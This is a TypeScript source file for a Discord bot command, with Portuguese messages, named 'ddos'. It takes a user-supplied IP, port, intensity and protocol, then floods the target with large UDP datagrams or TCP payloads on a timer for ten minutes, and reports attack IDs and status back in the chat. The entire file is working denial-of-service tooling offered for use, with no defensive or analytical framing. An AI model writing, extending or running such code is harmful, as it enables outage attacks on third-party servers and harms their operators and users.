import type { Message } from "discord.js";
import type { PrefixCommand } from "../../ai/commandRegistry.js";
import dgram from "dgram";
import net from "net";

// Objeto para armazenar ataques ativos
const activeAttacks: Record<
  string,
  {
    message: Message;
    port: number;
    force: number;
    method: string;
    startTime: number;
  }
> = {};

export const prefixCommand: PrefixCommand = {
  trigger: "ddos",
  description: "Realiza um ataque DDoS no alvo especificado",
  async execute(message: Message, args: string[]) {
    if (args[0] === "off") {
      const attackId = args[1];
      if (activeAttacks[attackId]) {
        clearInterval(activeAttacks[attackId].interval);
        delete activeAttacks[attackId];
        return message.reply(`✅ Ataque com ID ${attackId} interrompido.`);
      } else {
        return message.reply(
          "❌ ID de ataque inválido ou ataque já encerrado.",
        );
      }
    }

    const target = args[0];
    const port = parseInt(args[1]) || 80;
    const force = parseInt(args[2]) || 10;
    const method = (args[3] || "udp").toLowerCase();

    if (!target) {
      return message.reply(
        "Uso: `;ddos <ip> [porta] [força(1-20)] [método(udp/tcp)]` ou `;ddos off <id>`",
      );
    }

    if (force < 1 || force > 20) {
      return message.reply("❌ A força deve estar entre 1 e 20");
    }

    const attackId = Date.now().toString();
    activeAttacks[attackId] = {
      message,
      port,
      force,
      method,
      startTime: Date.now(),
    };

    // Mensagem inicial
    const attackMessage = await message.reply(
      `🔄 Iniciando ataque com ID ${attackId}...`,
    );

    // Função para enviar pacotes UDP
    const sendUdpPackets = () => {
      const socket = dgram.createSocket("udp4");
      const messageBuffer = Buffer.from("A" + " ".repeat(65500));
      socket.send(
        messageBuffer,
        0,
        messageBuffer.length,
        port,
        target,
        (err) => {
          if (err) console.error("Erro ao enviar pacote UDP:", err);
        },
      );
    };

    // Função para enviar pacotes TCP
    const sendTcpPackets = () => {
      const socket = new net.Socket();
      socket.connect(port, target, () => {
        socket.write("A".repeat(65500));
      });
      socket.on("error", (err) => {
        console.error("Erro ao enviar pacote TCP:", err);
      });
      socket.on("close", () => {
        socket.destroy();
      });
    };

    // Função para enviar pacotes com base no método
    const sendPackets = () => {
      if (method === "udp") {
        sendUdpPackets();
      } else if (method === "tcp") {
        sendTcpPackets();
      }
    };

    // Envia pacotes periodicamente
    activeAttacks[attackId].interval = setInterval(sendPackets, 1000 / force);

    // Encerra o ataque após 10 minutos
    setTimeout(() => {
      clearInterval(activeAttacks[attackId].interval);
      delete activeAttacks[attackId];
      attackMessage.edit(
        `✅ **Ataque concluído!**\n` +
          `🎯 Alvo: ${target}:${port}\n` +
          `⚡ Força: ${force}/20\n` +
          `📊 Status: ${method.toUpperCase()} Flood`,
      );
    }, 600000);
  },
};
